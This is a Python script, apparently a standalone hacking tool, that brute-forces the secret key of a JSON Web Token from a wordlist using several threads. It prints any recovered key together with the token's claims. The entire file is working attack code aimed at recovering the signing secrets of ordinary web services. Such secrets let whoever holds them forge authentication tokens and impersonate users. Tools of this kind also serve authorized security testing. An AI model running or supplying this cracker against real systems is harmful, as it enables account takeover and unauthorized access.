import jwt
import threading
import queue
import argparse
import json
import base64
import psutil
import time

# ASCII art
print(r"""
            /------------------------------------------------\
           |    _________________________________________     |
           |   |                                         |    |
           |   |  C:\> python3 JWT-Cracker.py            |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/
                ___________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-------------------------. .-.---. .---.-.-.-.`-_
:-------------------------------------------------------------------------:
`---._.-------------------------------------------------------------._.---' 
                 Creator: LeaveItBlank
""")

def read_keys_from_file(filename):
    """Reads keys from a file and returns a list of keys."""
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            keys = [line.strip() for line in file]
        return keys
    except Exception as e:
        print(f"Error reading keys from file '{filename}': {e}")
        return []

def detect_algorithm(token):
    """Detects the algorithm used in the JWT token."""
    try:
        header = token.split('.')[0]
        header_decoded = base64.urlsafe_b64decode(header + '==')
        header_json = json.loads(header_decoded)
        return header_json['alg']
    except Exception as e:
        print(f"Failed to detect algorithm: {e}")
        return None

def worker(token, key_queue, found_key, algorithm, batch_size=10, print_every=50):
    """Worker function that attempts to decode the JWT token with keys from the queue."""
    try:
        attempt_count = 0
        while not key_queue.empty() and not found_key.is_set():
            batch = []
            for _ in range(batch_size):
                if not key_queue.empty():
                    key = key_queue.get()
                    batch.append(key)
            try:
                for key in batch:
                    attempt_count += 1
                    try:
                        decoded_token = jwt.decode(token, key, algorithms=[algorithm])
                        claims = jwt.decode(token, key, algorithms=[algorithm], options={"verify_signature": False})
                        print("\n" + "="*50)
                        print("+" + " "*48 + "+")
                        print("|" + " "*18 + "Key found!" + " "*18 + "|")
                        print("|" + " "*48 + "|")
                        print("|" + f"{' '*21}{key}{' '*21}" + "|")
                        print("|" + " "*48 + "|")
                        print("|" + f"{' '*17}Claims: {claims}{' '*17}" + "|")
                        print("+" + " "*48 + "+")
                        print("="*50 + "\n")
                        found_key.set()
                        return
                    except jwt.InvalidTokenError as e:
                        if attempt_count % print_every == 0:
                            print(f"\nCracking...")
                            print(f"Invalid token error for key '{key}': {e}")
                    except jwt.DecodeError as e:
                        if attempt_count % print_every == 0:
                            print(f"\nCracking...")
                            print(f"Decode error for key '{key}': {e}")
                    except Exception as e:
                        if attempt_count % print_every == 0:
                            print(f"\nCracking...")
                            print(f"Error for key '{key}': {e}")
                    
                    # Print hardware usage every 50 attempts
                    if attempt_count % print_every == 0:
                        cpu_usage = psutil.cpu_percent()
                        memory_usage = psutil.virtual_memory().percent
                        print(f"CPU usage: {cpu_usage}%\nMemory usage: {memory_usage}%")

            finally:
                key_queue.task_done()

            if key_queue.empty() or found_key.is_set():
                break

    except Exception as e:
        print(f"Exception in worker: {e}")

def populate_queue(keys, key_queue):
    """Populates the queue with keys to be processed."""
    for key in keys:
        key_queue.put(key)

def main():
    parser = argparse.ArgumentParser(description="JWT Cracker using threading")
    parser.add_argument("token", help="The JWT token to crack")
    parser.add_argument("keyfile", help="File containing potential keys")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads to use (default: 4)")
    parser.add_argument("--batch-size", type=int, default=10, help="Number of keys to process in each batch (default: 10)")
    parser.add_argument("--print-every", type=int, default=50, help="Print progress every N attempts (default: 50)")

    args = parser.parse_args()

    # Read keys from the file
    keys = read_keys_from_file(args.keyfile)
    
    # Create a queue and populate it with keys
    key_queue = queue.Queue()
    populate_queue(keys, key_queue)
    num_threads = args.threads

    # Event to signal key found
    found_key = threading.Event()

    # Detect algorithm from the token
    token = args.token.strip()
    algorithm = detect_algorithm(token)
    if not algorithm:
        print("Failed to detect algorithm from the token.")
        return
    
    print(f"Detected algorithm: {algorithm}")

    # Start time for measuring execution duration
    start_time = time.time()

    # Start worker threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(token, key_queue, found_key, algorithm, args.batch_size, args.print_every))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    # End time for measuring execution duration
    end_time = time.time()
    duration = end_time - start_time
    print(f"Time taken: {duration:.2f} seconds")

    # If no key was found
    if not found_key.is_set():
        print("Failed to crack the JWT. All keys exhausted.")

    # Output the number of secrets used
    print(f"Number of secrets tried: {len(keys)}")

if __name__ == "__main__":
    main()